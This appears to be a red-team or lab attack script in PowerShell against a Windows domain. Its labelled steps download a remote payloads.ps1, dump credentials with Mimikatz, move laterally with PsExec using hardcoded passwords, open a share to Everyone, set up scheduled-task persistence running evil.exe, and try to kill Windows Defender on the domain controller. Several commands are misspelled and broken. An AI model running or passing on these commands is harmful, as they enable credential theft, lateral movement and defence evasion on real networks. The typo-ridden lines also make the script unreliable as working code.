"Inital access"

Set-Execition RemoteSigned
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/payloads.ps1" -OutFildire "payloads.ps1"


"Run Mimikatz on local PC"
mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern "\*\s+(Username|Domain|NTLM)\s+: .*" > mimiout.txt


"remotly run"
"Create Share"
$password = 'Cato2023!'
$user = "sec.content\danny"
$securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c mkdir c:\exploit "  -WindowStyle Hidden
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\defender-win10 cmd.exe /c net share exploit=c:\exploit /grant:Everyone,FULL " -WindowStyle Hidden

"Copy Mimikatz"
net use z: \\defender-win10\\exploit
xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y



"Run Mimikatz"
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\defender-win10 powershell -command `"c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debig sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+:.*' > c:\exploit\mimiout.txt"  -WindowStyle Hidden



"Creating precistance"
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 1 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden


"WMI Execution To DC"
$password = 'Cadmin!'
$user = "sec.content\Administrator"
$securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
$admincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c wmic /node:dcontent proces call where `"name='Windows Defender'`" call Terminate " -WindowStyle Hidden

"PsExec To the DC"
Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \\dcontent cmd.exe "  -WindowStyle Hidden